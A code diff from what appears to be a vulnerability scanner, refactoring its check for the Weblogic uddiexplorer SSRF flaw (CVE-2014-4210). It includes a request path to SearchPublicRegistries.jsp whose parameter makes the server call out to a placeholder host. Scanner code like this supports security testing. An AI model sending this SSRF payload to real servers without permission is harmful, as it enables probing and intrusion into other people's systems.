@@ -10,7 +10,7 @@ cve_2014_4210_payloads = [
     {'path': 'SearchPublicRegistries.jsp?operator=http://DNSDOMAIN/&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'}
 ]
 
-def cve_2014_4210_scan(self, clients):
+def cve_2014_4210_scan(clients):
     ''' Weblogic uddiexplorer SSRF漏洞
             uddiexplorer组件的SearchPublicRegistries.jsp页面存在一个SSRF漏洞
     '''
@@ -18,7 +18,7 @@ def cve_2014_4210_scan(self, clients):
     sessid = '0fe976335bbe903a97650f15dcb0ce47'
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Weblogic',
         'vul_type': 'SSRF',
         'vul_id': 'CVE-2014-4210',
     }
